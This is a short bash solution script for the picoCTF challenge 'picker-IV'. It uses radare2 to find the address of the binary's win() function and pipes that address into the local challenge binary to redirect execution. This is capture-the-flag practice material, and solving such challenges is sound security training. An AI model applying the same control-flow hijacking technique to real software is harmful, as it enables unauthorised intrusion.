#!/bin/bash

# https://play.picoctf.org/practice/challenge/403

# This one is quite straightforward if you are familiar with heap. We need to
# find the memory address of the `win()` function and pass that as input into
# the binary.

ADDY_WIN="$(r2 -e scr.color=false -q -AA -c afl ./picker-IV 2>/dev/null \
	| grep 'sym\.win' \
	| cut -d' ' -f1)"

echo "address of win [$ADDY_WIN]"
./picker-IV <<< "${ADDY_WIN:2}"
